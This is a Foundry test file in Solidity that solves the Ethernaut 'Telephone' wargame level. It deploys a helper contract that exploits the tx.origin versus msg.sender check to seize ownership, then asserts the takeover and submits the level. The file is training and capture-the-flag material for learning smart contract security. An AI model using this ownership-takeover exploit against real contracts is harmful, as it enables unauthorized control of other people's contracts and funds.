// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/core/Ethernaut.sol";
import "../src/levels/04-TelephoneFactory.sol";
import "openzeppelin-contracts/access/Ownable.sol";

contract TelephoneHackHelperContract is Ownable {
    Telephone telephone;

    constructor(address _telephoneContractAddress) {
        telephone = Telephone(_telephoneContractAddress);
    }

    function attack() public onlyOwner {
        telephone.changeOwner(msg.sender);
    }
}

contract TelephoneHackTest is Test {
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 wei);
    }

    function testTelephoneHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        TelephoneFactory factory = new TelephoneFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Telephone telephoneContract = Telephone(payable(levelAddress));
        TelephoneHackHelperContract hackHelperContract = new TelephoneHackHelperContract(
                levelAddress
            );

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // Hack through a contract so tx.origin != msg.sender
        // And thus ownership would be transferred
        hackHelperContract.attack();
        assertEq(telephoneContract.owner(), attacker);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
